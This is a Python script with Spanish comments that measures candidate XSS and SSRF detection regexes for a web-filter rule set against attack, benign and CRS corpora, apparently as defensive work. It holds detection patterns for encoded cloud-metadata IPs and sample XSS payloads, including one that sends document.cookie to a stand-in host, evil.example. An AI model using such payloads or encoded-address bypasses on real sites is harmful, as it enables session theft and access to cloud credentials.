"""Script de medición empírica para Claude R3 (NUEVO-3) y Claude R4 (NUEVO-5, NUEVO-6).

Mide:
1. Cuántas detecciones actuales dependen en exclusiva de las firmas que vamos a tocar.
2. Impacto en falsos positivos y verdaderos positivos sobre los 3 corpus (propio, retenido, CRS).
3. Verificación con y sin prefiltro (incluyendo relleno >= 150 bytes).
"""
from __future__ import annotations

import json
import re
import sys
from pathlib import Path

RAIZ = Path(__file__).resolve().parents[1]
PAQUETE = RAIZ / "gatekeeper-v0.3" / "gatekeeper"
sys.path.insert(0, str(PAQUETE / "src"))

from gatekeeper.rules import RULES, normalize, scan_detailed  # noqa: E402

CORPUS = PAQUETE / "corpus"


def cargar_corpus():
    attacks = json.loads((CORPUS / "attacks.json").read_text(encoding="utf-8"))["payloads"]
    benign = json.loads((CORPUS / "benign.json").read_text(encoding="utf-8"))["payloads"]
    ho_attacks = json.loads((CORPUS / "heldout_attacks.json").read_text(encoding="utf-8"))["payloads"]
    ho_benign = json.loads((CORPUS / "heldout_benign.json").read_text(encoding="utf-8"))["payloads"]
    crs = json.loads((CORPUS / "crs_payloads.json").read_text(encoding="utf-8"))["payloads"]
    return attacks, benign, ho_attacks, ho_benign, crs


def main() -> None:
    attacks, benign, ho_attacks, ho_benign, crs = cargar_corpus()

    # 1. Qué patrón es el índice 6 de RULES["xss"] (DOM XSS)
    for idx, pat in enumerate(RULES["xss"]):
        print(f"xss[{idx}]: {pat.pattern}")

    for idx, pat in enumerate(RULES["ssrf"]):
        print(f"ssrf[{idx}]: {pat.pattern}")

    # Medir cuántas detecciones actuales en los 3 corpus dependen SOLO de xss[6] y ssrf[5]
    solo_xss6 = []
    for a in attacks + ho_attacks:
        p = a["payload"]
        norm = normalize(p)
        hits = [i for i, pat in enumerate(RULES["xss"]) if pat.search(norm)]
        if hits == [6]:
            solo_xss6.append(p)
    print(f"Ataques (propio+retenido) que dependen SOLO de xss[6]: {len(solo_xss6)} -> {solo_xss6}")

    solo_xss6_crs = []
    for item in crs:
        if not item.get("is_attack", True):
            continue
        p = (item.get("uri") or "") + ("?" + item["data"] if item.get("data") else "")
        norm = normalize(p)
        hits = [i for i, pat in enumerate(RULES["xss"]) if pat.search(norm)]
        if hits == [6]:
            solo_xss6_crs.append(item["id"])
    print(f"Ataques CRS que dependen SOLO de xss[6]: {len(solo_xss6_crs)} -> {solo_xss6_crs}")

    # Candidato NUEVO-3 ampliado a toda la clase de acceso JS DOM:
    cand_xss = re.compile(
        r"\b(?:setinterval|settimeout|eval)\s{0,16}(?:\?\s{0,4}\.\s{0,8})?[\(`]"
        r"|(?<!/)\bdocument\s{0,8}(?:\?\s{0,4}\.\s{0,4}\[|\?\s{0,4}\.|\.|\[)"
        r"|\b(?:window|globalthis|top|parent|frames)\s{0,8}(?:\?\s{0,4}\.\s{0,4}\[|\?\s{0,4}\.|\.|\[)"
        r"|\bself\s{0,8}(?:\?\s{0,4}\.\s{0,4}\[|\?\s{0,4}\.(?!__)|\.(?!__)|\[)"
        r"|\blocation\s{0,8}(?:=|\?\s{0,4}\.\s{0,4}\[|\?\s{0,4}\.|\.\s{0,4}(?:href|replace|assign)\b|\[)"
    )

    # Comprobar si cand_xss roba alguna detección de otra familia en attacks o ho_attacks
    robos = []
    for a in attacks + ho_attacks:
        if a["rule"] != "xss":
            norm = normalize(a["payload"])
            if cand_xss.search(norm):
                robos.append((a["id"], a["rule"], a["payload"]))
    print(f"Robos de otras familias con cand_xss: {len(robos)} -> {robos}")
    for nombre_c, lista in [
        ("benign", [b["payload"] for b in benign]),
        ("ho_benign", [b["payload"] for b in ho_benign]),
        (
            "crs_neg",
            [
                (item.get("uri") or "") + ("?" + item["data"] if item.get("data") else "")
                for item in crs
                if not item.get("is_attack", True)
            ],
        ),
    ]:
        nuevos_fp = []
        for p in lista:
            norm = normalize(p)
            if cand_xss.search(norm) and scan_detailed(p) is None:
                nuevos_fp.append(p)
        print(f"[{nombre_c}] Nuevos FP con cand_xss: {len(nuevos_fp)} -> {nuevos_fp[:5]}")

    # Probemos todas las variantes de R3 y R4
    variantes_r3_r4 = {
        "r3_corchetes": "document['cookie']",
        "r3_corchetes+beacon": "(navigator.sendBeacon('//evil.example/x',document['cookie']),1)",
        "r3_optional_chaining": "document?.cookie",
        "r3_window_corchetes": "window['location']='http://evil.example/'",
        "r3_eval_corchetes": "window['eval']('1')",
        "r4_optional_chaining+corchetes": "document?.['cookie']",
        "r4_self.document corchetes": "self.document['cookie']",
        "r4_globalThis corchetes anidado": "globalThis['document']['cookie']",
        "r4_top optional-chaining": "top?.location",
        "r4_template literal como clave": "window[`eval`]('1')",
        "r4_concatenacion de strings como clave": "window['ev'+'al']('1')",
        "r4_concatenacion en document": "document[`coo`+`kie`]",
        "r4_setTimeout por corchetes": "window['setTimeout']('alert(1)',0)",
        "extra_eval_optional": "eval?.('alert(1)')",
        "extra_eval_template": "eval`alert(1)`",
        "extra_top_corchetes": "top['location']='//evil.example'",
        "extra_top_opt_corchetes": "top?.['location']",
        "extra_globalthis_dot": "globalThis.eval('1')",
        "extra_globalthis_opt": "globalThis?.document",
    }
    for nombre, v in variantes_r3_r4.items():
        norm = normalize(v)
        m = bool(cand_xss.search(norm))
        print(f"  {nombre:40}: {'OK' if m else 'MISS'} ({v})")

    # Candidato NUEVO-5 y NUEVO-6 (ssrf[5]):
    cand_ssrf = re.compile(
        r"(?:https?|ftp|ftps)://\s{0,4}"
        r"(?:2852039166|2852038914|1684301000|2130706433"        # decimal (IMDS, ECS, Alibaba, loopback)
        r"|0xa9fea9fe|0xa9feaa02|0x646464c8|0x7f000001"          # hex entero
        r"|0xa9\.0xfe\.0xa9\.0xfe|0x7f\.0x0{1,2}\.0x0{1,2}\.0x0?1"  # hex por octeto
        r"|0251\.0376\.0251\.0376"                               # octal IMDS (169.254.169.254)
        r"|0251\.0376\.025[12]\.0{0,3}2"                         # octal ECS (169.254.170.2)
        r"|0144\.0144\.0144\.0310"                               # octal Alibaba (100.100.100.200)
        r"|0177\.0{1,4}\.0{1,4}\.0{0,3}1"                        # octal loopback (127.0.0.1)
        r"|025177524776|025177525002|014431062310|017700000001)"  # octal entero
        r"(?![0-9a-fx.])"
    )
    for nombre_c, lista in [
        ("benign", [b["payload"] for b in benign]),
        ("ho_benign", [b["payload"] for b in ho_benign]),
        (
            "crs_neg",
            [
                (item.get("uri") or "") + ("?" + item["data"] if item.get("data") else "")
                for item in crs
                if not item.get("is_attack", True)
            ],
        ),
    ]:
        nuevos_fp = []
        for p in lista:
            norm = normalize(p)
            if cand_ssrf.search(norm) and scan_detailed(p) is None:
                nuevos_fp.append(p)
        print(f"[{nombre_c}] Nuevos FP con cand_ssrf: {len(nuevos_fp)} -> {nuevos_fp[:5]}")

    # Comprobar si decodificar \uXXXX en decode() produce algún FP en los 3 corpus
    u_esc = re.compile(r"\\u([0-9a-fA-F]{4})")
    for nombre_c, lista in [
        ("benign", [b["payload"] for b in benign]),
        ("ho_benign", [b["payload"] for b in ho_benign]),
        (
            "crs_neg",
            [
                (item.get("uri") or "") + ("?" + item["data"] if item.get("data") else "")
                for item in crs
                if not item.get("is_attack", True)
            ],
        ),
    ]:
        fp_u = []
        for p in lista:
            if "\\u" in p.lower():
                p2 = u_esc.sub(lambda m: chr(int(m.group(1), 16)), p)
                if scan_detailed(p2) is not None and scan_detailed(p) is None:
                    fp_u.append(p)
        print(f"[{nombre_c}] Nuevos FP con \\uXXXX decode: {len(fp_u)} -> {fp_u}")




if __name__ == "__main__":
    main()
